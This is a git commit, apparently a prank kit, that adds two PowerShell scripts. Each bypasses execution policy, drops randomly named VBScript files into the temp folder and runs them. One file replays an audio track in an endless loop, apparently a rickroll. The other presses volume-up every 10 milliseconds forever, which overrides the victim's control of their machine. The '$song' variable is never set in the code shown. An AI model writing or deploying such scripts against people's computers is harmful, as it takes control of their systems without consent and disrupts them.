3320f0d08e9e0108057ecc9a5a58ba4734810d0b
nickfour <105587657+nickfour@users.noreply.github.com>
2024-11-29 16:04:21 +0700

    A

---
+++ Autoplay/autoP1.ps1
@@ -0,0 +1,26 @@
+Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
+
+
+
+$randomNumber = Get-Random -Minimum 10 -Maximum 100  # สุ่มตัวเลข 2 หลัก
+
+# สร้างชื่อไฟล์โดยเพิ่มตัวเลข 2 หลักต่อท้าย
+$rickyouFileName = "$env:TMP\rickyou_$randomNumber.vbs"
+$volupFileName = "$env:TMP\volup_$randomNumber.vbs"
+
+$rickyouVbs = @"
+While True
+    Dim oPlayer
+    Set oPlayer = CreateObject("WMPlayer.OCX")
+    oPlayer.URL = "$song"
+    oPlayer.controls.play
+    While oPlayer.playState <> 1 ' 1 = Stopped
+        WScript.Sleep 100
+    Wend
+    oPlayer.close
+Wend
+"@
+Set-Content -Path $rickyouFileName -Value $rickyouVbs
+
+Start-Process -FilePath "wscript" -ArgumentList $rickyouFileName
+
---
+++ Autoplay/autoP2.ps1
@@ -0,0 +1,35 @@
+Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
+
+
+
+$randomNumber = Get-Random -Minimum 10 -Maximum 100  # สุ่มตัวเลข 2 หลัก
+
+# สร้างชื่อไฟล์โดยเพิ่มตัวเลข 2 หลักต่อท้าย
+$rickyouFileName = "$env:TMP\rickyou_$randomNumber.vbs"
+$volupFileName = "$env:TMP\volup_$randomNumber.vbs"
+
+$rickyouVbs = @"
+While True
+    Dim oPlayer
+    Set oPlayer = CreateObject("WMPlayer.OCX")
+    oPlayer.URL = "$song"
+    oPlayer.controls.play
+    While oPlayer.playState <> 1 ' 1 = Stopped
+        WScript.Sleep 100
+    Wend
+    oPlayer.close
+Wend
+"@
+Set-Content -Path $rickyouFileName -Value $rickyouVbs
+
+$volupVbs = @"
+Do
+    Set WshShell = CreateObject("WScript.Shell")
+    WshShell.SendKeys Chr(&hAF)
+    WScript.Sleep 10
+Loop
+"@
+Set-Content -Path $volupFileName -Value $volupVbs
+
+Start-Process -FilePath "wscript" -ArgumentList $rickyouFileName
+Start-Process -FilePath "wscript" -ArgumentList $volupFileName
